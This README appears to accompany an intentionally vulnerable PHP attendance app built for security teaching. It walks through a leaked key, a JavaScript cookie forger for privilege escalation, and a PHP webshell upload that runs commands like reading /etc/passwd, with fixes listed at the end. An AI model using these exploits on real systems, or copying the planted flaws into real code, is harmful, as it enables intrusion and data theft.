# AttendanceMS — Vulnerable Web Application

> ⚠️ **WARNING: This application is intentionally vulnerable. Do NOT deploy on a public server or production environment. For educational/CTF use only.**

A PHP-based Attendance Management System built with intentional security vulnerabilities for security education.

---

## Tech Stack

| Layer    | Technology         |
|----------|--------------------|
| Backend  | PHP 8.1            |
| Web Server | Apache 2.4       |
| Database | MySQL 8.0          |
| Container| Docker + Compose   |

---

## Project Structure

```
vuln-attendance/
├── docker-compose.yml        # Orchestrates web + db containers
├── Dockerfile                # PHP/Apache image with vuln config
├── mysql/
│   └── init.sql              # DB schema + seed data
└── src/                      # Web root (/var/www/html)
    ├── index.php             # Login page
    ├── dashboard.php         # Home after login
    ├── attendance.php        # Mark attendance (lecturer only)
    ├── records.php           # View attendance records
    ├── upload.php            # CSV import (VULN: RCE)
    ├── logout.php            # Clear session
    ├── info.php              # VULN: phpinfo()
    ├── exploit_cookie.php    # Exploit demo helper page
    ├── db.php                # DB connection + VULN: weak encryption
    ├── auth.php              # VULN: cookie-based auth
    ├── css/
    │   └── style.css
    ├── partials/
    │   ├── header.php
    │   └── sidebar.php
    └── uploads/              # VULN: PHP-executable upload directory
```

---

## Prerequisites

- [Docker Desktop](https://www.docker.com/products/docker-desktop/) installed
- [VS Code](https://code.visualstudio.com/) (recommended: install the **Docker** extension)
- Git

---

## Deployment Instructions

### 1. Clone the repository

```bash
git clone https://github.com/YOUR_USERNAME/vuln-attendance.git
cd vuln-attendance
```

### 2. Start the application

```bash
docker compose up --build
```

Wait for output like:
```
vuln_attendance_db   | ... MySQL init process done. Ready for connections.
vuln_attendance_web  | AH00558: apache2: Could not reliably determine...
```

### 3. Access the application

| URL | Description |
|-----|-------------|
| http://localhost:8080 | Main login page |
| http://localhost:8080/info.php | Vulnerability 1: phpinfo |
| http://localhost:8080/exploit_cookie.php | Privilege escalation helper |
| http://localhost:8080/upload.php | File upload (RCE) |

### 4. Demo credentials

| Username | Password | Role |
|----------|----------|------|
| dr.smith | password123 | Lecturer |
| prof.tan | letmein | Lecturer |

### 5. Stop the application

```bash
docker compose down
```

To also delete the database volume:
```bash
docker compose down -v
```

---

## Vulnerabilities

### 1. 🟡 LOW — phpinfo() Exposed (`/info.php`)

**File:** `src/info.php`

```php
<?php phpinfo(); ?>
```

**What it exposes:**
- PHP version and build configuration
- All loaded modules and extensions
- Apache environment variables — **including `ENCRYPTION_KEY=secret123`**
- Server paths, OS details, and more

**How to exploit:**
1. Visit `http://localhost:8080/info.php`
2. Press `Ctrl+F` and search for `ENCRYPTION_KEY`
3. Note the value: `secret123`

**Impact:** Provides the key needed for Vulnerability 2.

---

### 2. 🔴 HIGH — Privilege Escalation via Weak Cookie Encryption

**Files:** `src/db.php`, `src/auth.php`

**Vulnerability details:**

```php
// db.php — hardcoded key also set as environment variable
define('ENCRYPTION_KEY', 'secret123');

// "Encryption" is simple XOR — trivially reversible
function encryptData($data) {
    $key = ENCRYPTION_KEY;
    $encrypted = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $encrypted .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return base64_encode($encrypted);
}
```

The auth cookie stores: `{userId}|{role}|{username}` encrypted with XOR + base64.

**How to exploit (manual):**
1. Visit `/info.php` → find `ENCRYPTION_KEY=secret123`
2. Open browser DevTools → Console, paste:
```js
function xorEncrypt(data, key='secret123') {
    let out = '';
    for (let i=0; i<data.length; i++)
        out += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    return btoa(out);
}
// Forge a lecturer cookie for user ID 1
document.cookie = 'auth_token=' + xorEncrypt('1|lecturer|dr.smith') + '; path=/';
```
3. Navigate to `http://localhost:8080/dashboard.php` — you are now authenticated as a lecturer without knowing the password.

**Automated exploit:**
Visit `http://localhost:8080/exploit_cookie.php` for a point-and-click exploit demo.

**Root causes:**
- Hardcoded encryption key
- Key exposed via `phpinfo()`
- Weak XOR cipher (not true encryption)
- Role trusted entirely from client-side cookie

---

### 3. 🔴 CRITICAL — Remote Code Execution via File Upload

**File:** `src/upload.php`

**Vulnerability details:**

```php
// No file type validation whatsoever
$filename = basename($file['name']);
$dest = $uploadDir . $filename;
move_uploaded_file($file['tmp_name'], $dest);
// File stored in /uploads/ where Apache executes PHP
```

The `Dockerfile` also configures Apache to execute PHP in the uploads directory:

```dockerfile
RUN echo '<Directory /var/www/html/uploads>
    Options +ExecCGI
    AllowOverride All
</Directory>' > /etc/apache2/conf-available/uploads.conf
```

**How to exploit:**

**Step 1:** Log in as lecturer (or use the cookie exploit above).

**Step 2:** Create a PHP webshell file called `shell.php`:
```php
<?php system($_GET['cmd']); ?>
```

**Step 3:** Go to `http://localhost:8080/upload.php` and upload `shell.php`.

**Step 4:** Execute commands:
```
http://localhost:8080/uploads/shell.php?cmd=id
http://localhost:8080/uploads/shell.php?cmd=cat+/etc/passwd
http://localhost:8080/uploads/shell.php?cmd=ls+-la+/var/www/html
```

**Root causes:**
- No MIME type validation
- No file extension whitelist
- Upload directory has PHP execution permissions
- No content scanning

---

## Full Attack Chain

```
[Attacker]
    │
    ├─1─▶ GET /info.php
    │         └─▶ Discovers ENCRYPTION_KEY=secret123
    │
    ├─2─▶ Forge auth_token cookie
    │         └─▶ XOR("1|lecturer|dr.smith", "secret123") → base64
    │         └─▶ Set cookie in browser
    │
    ├─3─▶ GET /dashboard.php  (now authenticated as dr.smith)
    │
    ├─4─▶ POST /upload.php  (upload shell.php webshell)
    │
    └─5─▶ GET /uploads/shell.php?cmd=id
              └─▶ RCE achieved inside Docker container
```

---

## Git Workflow

```bash
# Initial setup
git init
git remote add origin https://github.com/YOUR_USERNAME/vuln-attendance.git

# First commit
git add .
git commit -m "feat: initial vulnerable attendance app"
git push -u origin main

# After changes
git add src/upload.php
git commit -m "feat: add CSV import (intentionally vulnerable upload)"
git push
```

---

## Remediation (What should be done in a real app)

| Vulnerability | Fix |
|---|---|
| phpinfo() exposed | Remove `info.php` entirely in production |
| Hardcoded key | Use environment secrets, never commit keys |
| Weak XOR cipher | Use `openssl_encrypt` with AES-256 or signed JWTs |
| Cookie role trust | Validate role against database on every request |
| No upload validation | Whitelist extensions (`.csv` only), check MIME type, store outside web root |
| MD5 passwords | Use `password_hash()` / `password_verify()` with bcrypt |
| SQL Injection | Use prepared statements with `mysqli_prepare()` |

---

## License

For educational use only. Do not deploy publicly.
